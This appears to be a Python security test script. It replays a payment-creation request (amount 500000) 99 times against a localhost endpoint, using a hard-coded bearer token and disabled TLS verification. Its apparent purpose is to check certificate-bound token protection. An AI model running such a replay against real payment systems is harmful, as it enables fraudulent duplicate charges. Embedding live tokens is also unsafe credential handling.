import requests
import urllib3
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://localhost:8888/api/vnpay/create"
TOKEN = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJIbDVqRUNMbGxic29pTkp1ZUVGV3BaVnlhcldFeGxHNFBKVE54QnloN2tBIn0.eyJleHAiOjE3NzY2OTQzNDEsImlhdCI6MTc3NjY5NDA0MSwiYXV0aF90aW1lIjoxNzc2Njg5NTQwLCJqdGkiOiIwYmQwOTRlYy1jZWQ0LTRmZTktYTAyZC0zY2JjYzRkM2ZmYzEiLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdDo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJzdWIiOiJiZWJiNjk1NC0wZTBmLTQ3ZmMtODkzZS0yNmFmZGY1NjYyNmEiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJwYXlzaGllbGQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjQwZTBjMDFkLTkxZjEtNGM1Ni04NjBiLTUzOTI4ZDdjY2FiOCIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiaHR0cDovL2xvY2FsaG9zdDo2ODY4IiwiaHR0cHM6Ly9vYXV0aC5wc3Rtbi5pbyIsImh0dHBzOi8vbG9jYWxob3N0Ojg4ODgiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbImVtcGxveWVlIl19LCJjbmYiOnsieDV0I1MyNTYiOiJwVXFsaU50U3hGckl2LUgyQ01xMVNsYTFMekhMLW9xZHYxbkZtV1JQclYwIn0sInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZW1haWwiLCJzaWQiOiI0MGUwYzAxZC05MWYxLTRjNTYtODYwYi01MzkyOGQ3Y2NhYjgiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6Ikh1bmcgTmd1eWVuIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIiwiZ2l2ZW5fbmFtZSI6Ikh1bmciLCJmYW1pbHlfbmFtZSI6Ik5ndXllbiIsImVtYWlsIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIn0.ISK3pbckiMXezQv7sg7gHcIzNy8AmQmD7ZAGX8qbRCKwA5GL4nOPsJlte_qygBJEd8P32S32eN8oO4ItGLwRVLGdKo00VTNM6sOOeM69c1gWE_JVsvacw2__kFWHD9GnixFghOJoQsNL-tkw6_li28o-OU5tCFgtYJZ9jT3aR1v1dOvCxc25gBqnr8ofj4O-9GWFuvgxAS0HAR8hIQn-wNRe6o4mTlnHerc7CCutlTF5S7F0ZBz-Mu6Tr7UhziHO-Q-KmntEqFXW-DKJXIJIsdkPJNYNiJMB9WPbZEX_TKSGne0clKg2nCBlHhvA-ODAn8wCPWu_h8qIR5mPpskIjQ" 
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
PAYLOAD = {"amount": 500000}

def replay_attack_no_cert():
    stats = defaultdict(int)
    print("=== REPLAY ATTACK ===")
    
    for i in range(1, 100):
        try:
            res = requests.post(URL, headers=HEADERS, json=PAYLOAD, verify=False, timeout=5)
            stats[res.status_code] += 1
            print(f"[*] Lần {i}: HTTP {res.status_code}")
        except requests.exceptions.SSLError as e:
            print(f"[*] Lần {i}: Lỗi SSL")
            stats["SSL Error"] += 1
        except Exception as e:
            stats["Error"] += 1

    print(f"\n--- KẾT QUẢ ---")
    for status, count in stats.items():
        print(f"{status}: {count} lần")

replay_attack_no_cert()